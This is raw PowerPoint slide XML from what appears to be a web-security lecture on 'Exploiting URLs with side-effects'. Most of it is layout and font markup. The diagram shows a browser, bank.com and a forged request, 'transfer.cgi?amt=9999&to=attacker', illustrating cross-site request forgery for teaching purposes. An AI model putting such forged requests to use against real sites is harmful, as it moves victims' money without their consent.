              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2780"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2118" b="1">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82965" name="object 22"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="780000">
            <a:off x="4675655" y="4751330"/>
            <a:ext cx="3353360" cy="243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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="1887"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>HabibB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>ank.com/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588" b="1">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82966" name="object 23"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="780000">
            <a:off x="3952875" y="4990264"/>
            <a:ext cx="4391306"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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="1831"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>transfer.cgi?amt=9999&amp;to=attacker</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="13" name="Straight Arrow Connector 12"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3742765" y="4101353"/>
            <a:ext cx="4633632" cy="114300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384956029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78449" y="191902"/>
            <a:ext cx="7433703" cy="611065"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="3971" spc="18" dirty="0"/>
              <a:t>Exploiting </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-63" dirty="0"/>
              <a:t>URLs </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-4" dirty="0"/>
              <a:t>with</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="14" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="27" dirty="0"/>
              <a:t>side-effects</a:t>
            </a:r>
            <a:endParaRPr sz="3971"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83971" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2795868" y="2608170"/>
            <a:ext cx="1294279" cy="1392331"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83972" name="object 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="2616574"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83973" name="object 5"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2801471" y="2616574"/>
            <a:ext cx="1243853" cy="1339103"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 1821814"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T5" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 1821814"/>
              <a:gd name="T7" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 1821814"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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21814" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1821230" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1821230" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="009CFD">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3053603" y="3151655"/>
            <a:ext cx="890868" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>B</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-31" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>owser</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3036795" y="2151529"/>
            <a:ext cx="815228" cy="380232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Client</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83976" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8547287" y="1638861"/>
            <a:ext cx="1818154" cy="830636"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
